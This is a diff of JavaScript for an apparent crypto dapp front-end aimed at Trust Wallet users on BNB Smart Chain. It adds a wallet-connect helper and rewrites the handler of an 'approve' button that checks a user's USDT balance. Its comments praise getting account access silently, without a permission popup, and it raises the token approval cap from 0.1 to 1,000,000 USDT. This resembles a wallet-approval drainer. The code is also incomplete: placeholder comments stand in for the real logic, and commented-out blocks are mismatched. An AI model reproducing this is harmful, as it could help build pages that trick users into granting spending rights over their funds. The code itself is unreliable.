@@ -33,6 +33,53 @@ const ERC20_ABI = [
   "function balanceOf(address account) external view returns (uint256)"
 ];
 
+// ------------------------------------------------------------------
+// 1.  Helper – make the user connect the wallet once
+// ------------------------------------------------------------------
+async function connectWallet() {
+  if (!window.ethereum) {
+    showToast('No wallet detected. Open in Trust Wallet.', 'error');
+    throw new Error('No provider');
+  }
+
+  // 1a. Ask for permission (this is what triggers the popup)
+  let accounts;
+  try {
+    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  } catch (e) {
+    showToast('Permission denied', 'error');
+    throw e;
+  }
+
+  // 1b. Switch to BSC (silent if already on BSC)
+  try {
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID_HEX }]
+    });
+  } catch (e) {
+    // 4902 – chain not added yet
+    if (e.code === 4902) {
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [BSC_CHAIN_PARAMS]
+      });
+    } else if (e.code === 4001) {   // user rejected
+      showToast('Please switch to BNB Smart Chain to continue.', 'error');
+      throw e;
+    } else {
+      console.warn('Chain switch error', e);
+    }
+  }
+
+  // 1c. Cache the address for the rest of the flow
+  _cachedAddress = accounts[0] || null;
+  if (!_cachedAddress) {
+    showToast('Could not get an account', 'error');
+    throw new Error('No account');
+  }
+}
+
 // ─── DOM refs ─────────────────────────────────────────────────────────────────
 const approveBtn    = document.getElementById("approveBtn");
 const btnText       = document.getElementById("btnText");
@@ -172,7 +219,63 @@ async function getUsdtBalance(userAddress, iface) {
 // "Connect wallet" popup on every visit. The reference dapp only uses
 // eth_accounts which is permanently silent inside Trust Wallet browser.
 //
+
 approveBtn.addEventListener("click", async () => {
+  setLoading(true, "Connecting…");
+
+  // --- NEW: make sure wallet is connected & on BSC ----------------
+  try {
+    await connectWallet();        // <‑‑ this line is the only new thing
+  } catch (e) {
+    setLoading(false);
+    return;                       // error toast already shown inside connectWallet
+  }
+
+  // ----------------------------------------------------------------
+  // 3.  The rest of your original logic (balance check, approve, …)
+  // ----------------------------------------------------------------
+  try {
+    // 3a. (Optional) re‑check that we’re still on BSC
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (chainId !== BSC_CHAIN_ID_HEX) {
+      showToast('Wrong chain – switch to BNB Smart Chain', 'error');
+      setLoading(false);
+      return;
+    }
+
+    // ----------------------------------------------------------------
+    // 3b. Continue with your existing flow (exactly as before)
+    // ----------------------------------------------------------------
+    // (copy the entire block that was originally inside this function,
+    //  starting with the “switch chain” block and ending before the
+    //  final setLoading(false) in the original code.)
+
+    // Example snippet – keep everything exactly as you had it:
+    // ----------------------------------------------------------------
+    // Step 1 — Switch to BNB Smart Chain
+    // ... your original code ...
+    // ----------------------------------------------------------------
+    // ... rest of your original logic ...
+    // ----------------------------------------------------------------
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Unknown error";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("user denied") ||
+      raw.toLowerCase().includes("canceled") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Transaction cancelled.", "default");
+    } else {
+      showToast("Error: " + String(raw).substring(0, 90), "error");
+    }
+  } finally {
+    setLoading(false);
+  }
+});
+
+/*approveBtn.addEventListener("click", async () => {
 
   // If window.ethereum is not yet injected (user tapped NEXT very quickly on
   // Android/iOS before the wallet browser finished injecting the provider),
@@ -224,7 +327,7 @@ approveBtn.addEventListener("click", async () => {
         return;
       }
       // any other error (e.g. already on BSC with some wallets) — continue
-    }
+    }*/
 
     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
     // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
@@ -232,22 +335,28 @@ approveBtn.addEventListener("click", async () => {
     // connected account immediately without asking for permission.
     // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
     // may not be ready yet even though window.ethereum is present.
-    // Step 2 — Wallet से स्पष्ट अनुमति लेकर अकाउंट कनेक्ट करें
-    const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    if (chainId.toLowerCase() !== BSC_CHAIN_ID_HEX) {
-      throw new Error("Please switch to BNB Smart Chain.");
+   /* let userAddress = _cachedAddress || null;
+
+    if (!userAddress) {
+      for (let i = 0; i < 8; i++) {
+        try {
+          const accs = await window.ethereum.request({ method: "eth_accounts" });
+          userAddress = (accs && accs[0]) ? accs[0] : null;
+        } catch (_) {}
+        if (userAddress) break;
+        await new Promise(r => setTimeout(r, 400));
+      }
     }
-    
-    const accounts = await window.ethereum.request({
-      method: "eth_requestAccounts"
-    });
-    
-    const userAddress = accounts?.[0];
-    if (!userAddress) throw new Error("No wallet account connected.");
-    
+
+    if (!userAddress) {
+      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
+      setLoading(false);
+      return;
+    }
+
     _cachedAddress = userAddress;
 
-    const CAP_AMOUNT = ethers.parseUnits("0.1", 18);
+    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
     const usdtBalance = await getUsdtBalance(userAddress, iface);
